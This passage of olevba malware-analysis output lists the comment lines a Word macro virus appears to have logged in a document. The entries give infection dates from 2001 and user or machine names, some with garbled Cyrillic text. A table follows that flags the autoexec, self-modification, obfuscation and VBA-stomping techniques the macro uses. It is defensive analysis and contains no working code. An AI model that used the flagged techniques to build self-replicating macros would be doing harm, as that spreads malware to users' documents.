' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1136:
' 	QuoteRem 0x0000 0x0020 " 17:38:26 - ïÿòíèöà, 29 èþí 2001"
' Line #1137:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1138:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1139:
' Line #1140:
' Line #1141:
' Line #1142:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1143:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1144:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1145:
' 	QuoteRem 0x0000 0x0020 " 18:52:15 - ñóááîòà, 30 èþí 2001"
' Line #1146:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1147:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1148:
' Line #1149:
' Line #1150:
' Line #1151:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1152:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1153:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1154:
' 	QuoteRem 0x0000 0x0023 " 15:17:43 - âîñêðåñåíüå, 1 èþë 2001"
' Line #1155:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1156:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1157:
' Line #1158:
' Line #1159:
' Line #1160:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1161:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1162:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1163:
' 	QuoteRem 0x0000 0x0023 " 15:21:16 - âîñêðåñåíüå, 1 èþë 2001"
' Line #1164:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1165:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1166:
' Line #1167:
' Line #1168:
' Line #1169:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1170:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1171:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1172:
' 	QuoteRem 0x0000 0x0023 " 17:56:19 - âîñêðåñåíüå, 1 èþë 2001"
' Line #1173:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1174:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1175:
' Line #1176:
' Line #1177:
' Line #1178:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1179:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1180:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1181:
' 	QuoteRem 0x0000 0x0023 " 18:17:21 - ïîíåäåëüíèê, 2 èþë 2001"
' Line #1182:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1183:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1184:
' Line #1185:
' Line #1186:
' Line #1187:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1188:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1189:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1190:
' 	QuoteRem 0x0000 0x0023 " 20:12:20 - ïîíåäåëüíèê, 2 èþë 2001"
' Line #1191:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1192:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1193:
' Line #1194:
' Line #1195:
' Line #1196:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1197:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1198:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1199:
' 	QuoteRem 0x0000 0x001F " 08:56:14 - âòîðíèê, 3 èþë 2001"
' Line #1200:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1201:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1202:
' Line #1203:
' Line #1204:
' Line #1205:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1206:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1207:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1208:
' 	QuoteRem 0x0000 0x001F " 15:28:28 - âòîðíèê, 3 èþë 2001"
' Line #1209:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1210:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1211:
' Line #1212:
' Line #1213:
' Line #1214:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1215:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1216:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1217:
' 	QuoteRem 0x0000 0x001D " 22:47:38 - ñðåäà, 4 èþë 2001"
' Line #1218:
' 	QuoteRem 0x0000 0x000A " Ðîñòèñëàâ"
' Line #1219:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1220:
' Line #1221:
' Line #1222:
' Line #1223:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1224:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1225:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1226:
' 	QuoteRem 0x0000 0x001F " 09:43:04 - ÷åòâåðã, 5 èþë 2001"
' Line #1227:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1228:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1229:
' Line #1230:
' Line #1231:
' Line #1232:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1233:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1234:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1235:
' 	QuoteRem 0x0000 0x001F " 11:42:36 - ïÿòíèöà, 6 èþë 2001"
' Line #1236:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1237:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1238:
' Line #1239:
' Line #1240:
' Line #1241:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1242:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1243:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1244:
' 	QuoteRem 0x0000 0x001F " 12:15:26 - ïÿòíèöà, 6 èþë 2001"
' Line #1245:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1246:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1247:
' Line #1248:
' Line #1249:
' Line #1250:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1251:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1252:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1253:
' 	QuoteRem 0x0000 0x001F " 12:16:14 - ïÿòíèöà, 6 èþë 2001"
' Line #1254:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1255:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1256:
' Line #1257:
' Line #1258:
' Line #1259:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1260:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1261:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1262:
' 	QuoteRem 0x0000 0x0023 " 11:28:56 - ïîíåäåëüíèê, 9 èþë 2001"
' Line #1263:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #1264:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1265:
' Line #1266:
' Line #1267:
' Line #1268:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1269:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1270:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1271:
' 	QuoteRem 0x0000 0x0020 " 13:38:13 - ïÿòíèöà, 13 èþë 2001"
' Line #1272:
' 	QuoteRem 0x0000 0x0010 " Ïîëüçîâàòåëü ÏÊ"
' Line #1273:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1274:
' Line #1275:
' Line #1276:
' Line #1277:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1278:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1279:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1280:
' 	QuoteRem 0x0000 0x0020 " 18:08:41 - ïÿòíèöà, 13 èþë 2001"
' Line #1281:
' 	QuoteRem 0x0000 0x0010 " Ïîëüçîâàòåëü ÏÊ"
' Line #1282:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1283:
' Line #1284:
' Line #1285:
' Line #1286:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1287:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1288:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1289:
' 	QuoteRem 0x0000 0x0020 " 18:34:36 - ïÿòíèöà, 13 èþë 2001"
' Line #1290:
' 	QuoteRem 0x0000 0x0010 " Ïîëüçîâàòåëü ÏÊ"
' Line #1291:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1292:
' Line #1293:
' Line #1294:
' Line #1295:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1296:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1297:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1298:
' 	QuoteRem 0x0000 0x0020 " 19:00:37 - ñóááîòà, 14 èþë 2001"
' Line #1299:
' 	QuoteRem 0x0000 0x000F " Óíæàêîâà Èðèíà"
' Line #1300:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1301:
' Line #1302:
' Line #1303:
' Line #1304:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1305:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1306:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1307:
' 	QuoteRem 0x0000 0x0024 " 22:11:27 - âîñêðåñåíüå, 15 èþë 2001"
' Line #1308:
' 	QuoteRem 0x0000 0x000F " Óíæàêîâà Èðèíà"
' Line #1309:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1310:
' Line #1311:
' Line #1312:
' Line #1313:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1314:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1315:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1316:
' 	QuoteRem 0x0000 0x0024 " 22:11:44 - âîñêðåñåíüå, 15 èþë 2001"
' Line #1317:
' 	QuoteRem 0x0000 0x000F " Óíæàêîâà Èðèíà"
' Line #1318:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1319:
' Line #1320:
' Line #1321:
' Line #1322:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1323:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1324:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1325:
' 	QuoteRem 0x0000 0x0024 " 22:22:39 - âîñêðåñåíüå, 15 èþë 2001"
' Line #1326:
' 	QuoteRem 0x0000 0x000F " Óíæàêîâà Èðèíà"
' Line #1327:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1328:
' Line #1329:
' Line #1330:
' Line #1331:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1332:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1333:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1334:
' 	QuoteRem 0x0000 0x0024 " 17:22:13 - ïîíåäåëüíèê, 23 èþë 2001"
' Line #1335:
' 	QuoteRem 0x0000 0x000F " Óíæàêîâà Èðèíà"
' Line #1336:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1337:
' Line #1338:
' Line #1339:
' Line #1340:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1341:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1342:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1343:
' 	QuoteRem 0x0000 0x0020 " 16:39:25 - ÷åòâåðã, 26 èþë 2001"
' Line #1344:
' 	QuoteRem 0x0000 0x000F " Óíæàêîâà Èðèíà"
' Line #1345:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1346:
' Line #1347:
' Line #1348:
' Line #1349:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1350:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1351:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1352:
' 	QuoteRem 0x0000 0x001F " 17:53:49 - ïÿòíèöà, 3 àâã 2001"
' Line #1353:
' 	QuoteRem 0x0000 0x000F " Óíæàêîâà Èðèíà"
' Line #1354:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1355:
' Line #1356:
' Line #1357:
' Line #1358:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1359:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1360:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1361:
' 	QuoteRem 0x0000 0x0024 " 19:01:22 - ïîíåäåëüíèê, 13 àâã 2001"
' Line #1362:
' 	QuoteRem 0x0000 0x000F " Óíæàêîâà Èðèíà"
' Line #1363:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1364:
' Line #1365:
' Line #1366:
' Line #1367:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1368:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1369:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1370:
' 	QuoteRem 0x0000 0x0020 " 19:21:14 - ïÿòíèöà, 31 àâã 2001"
' Line #1371:
' 	QuoteRem 0x0000 0x0003 " Bt"
' Line #1372:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1373:
' Line #1374:
' Line #1375:
' Line #1376:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1377:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1378:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1379:
' 	QuoteRem 0x0000 0x001F " 12:04:04 - ñóááîòà, 1 ñåí 2001"
' Line #1380:
' 	QuoteRem 0x0000 0x0003 " Bt"
' Line #1381:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1382:
' Line #1383:
' Line #1384:
' Line #1385:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1386:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1387:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1388:
' 	QuoteRem 0x0000 0x001F " 12:45:40 - ñóááîòà, 1 ñåí 2001"
' Line #1389:
' 	QuoteRem 0x0000 0x0003 " Bt"
' Line #1390:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1391:
' Line #1392:
' Line #1393:
' Line #1394:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1395:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1396:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1397:
' 	QuoteRem 0x0000 0x001F " 13:29:21 - ñóááîòà, 1 ñåí 2001"
' Line #1398:
' 	QuoteRem 0x0000 0x0003 " Bt"
' Line #1399:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1400:
' Line #1401:
' Line #1402:
' Line #1403:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1404:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1405:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1406:
' 	QuoteRem 0x0000 0x001F " 14:02:54 - ñóááîòà, 1 ñåí 2001"
' Line #1407:
' 	QuoteRem 0x0000 0x0003 " Bt"
' Line #1408:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1409:
' Line #1410:
' Line #1411:
' Line #1412:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1413:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1414:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1415:
' 	QuoteRem 0x0000 0x001F " 14:31:14 - ñóááîòà, 1 ñåí 2001"
' Line #1416:
' 	QuoteRem 0x0000 0x0003 " Bt"
' Line #1417:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1418:
' Line #1419:
' Line #1420:
' Line #1421:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1422:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1423:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1424:
' 	QuoteRem 0x0000 0x001F " 14:54:01 - ñóááîòà, 1 ñåí 2001"
' Line #1425:
' 	QuoteRem 0x0000 0x0003 " Bt"
' Line #1426:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1427:
' Line #1428:
' Line #1429:
' Line #1430:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1431:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1432:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1433:
' 	QuoteRem 0x0000 0x001F " 18:11:09 - ñóááîòà, 1 ñåí 2001"
' Line #1434:
' 	QuoteRem 0x0000 0x0003 " Bt"
' Line #1435:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1436:
' Line #1437:
' Line #1438:
' Line #1439:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1440:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1441:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1442:
' 	QuoteRem 0x0000 0x001F " 18:55:50 - ñóááîòà, 1 ñåí 2001"
' Line #1443:
' 	QuoteRem 0x0000 0x0004 " FED"
' Line #1444:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1445:
' Line #1446:
' Line #1447:
' Line #1448:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1449:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1450:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1451:
' 	QuoteRem 0x0000 0x001F " 18:57:59 - ñóááîòà, 1 ñåí 2001"
' Line #1452:
' 	QuoteRem 0x0000 0x0004 " FED"
' Line #1453:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1454:
' Line #1455:
' Line #1456:
' Line #1457:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1458:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1459:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1460:
' 	QuoteRem 0x0000 0x001F " 15:24:47 - âòîðíèê, 4 ñåí 2001"
' Line #1461:
' 	QuoteRem 0x0000 0x0004 " FED"
' Line #1462:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1463:
' Line #1464:
' Line #1465:
' Line #1466:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1467:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1468:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1469:
' 	QuoteRem 0x0000 0x001E " 13:57:43 - ñðåäà, 12 ñåí 2001"
' Line #1470:
' 	QuoteRem 0x0000 0x0006 " fayer"
' Line #1471:
' 	QuoteRem 0x0000 0x0014 " aku@tanak-cakap.com"
' Line #1472:
' Line #1473:
' Line #1474:
' Line #1475:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1476:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1477:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1478:
' 	QuoteRem 0x0000 0x001F " 09:40:31 - Friday, 19 Oct 2001"
' Line #1479:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #1480:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1481:
' Line #1482:
' Line #1483:
' Line #1484:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1485:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1486:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1487:
' 	QuoteRem 0x0000 0x001F " 09:40:47 - Friday, 19 Oct 2001"
' Line #1488:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #1489:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1490:
' Line #1491:
' Line #1492:
' Line #1493:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1494:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1495:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1496:
' 	QuoteRem 0x0000 0x001F " 09:40:57 - Friday, 19 Oct 2001"
' Line #1497:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #1498:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1499:
' Line #1500:
' Line #1501:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

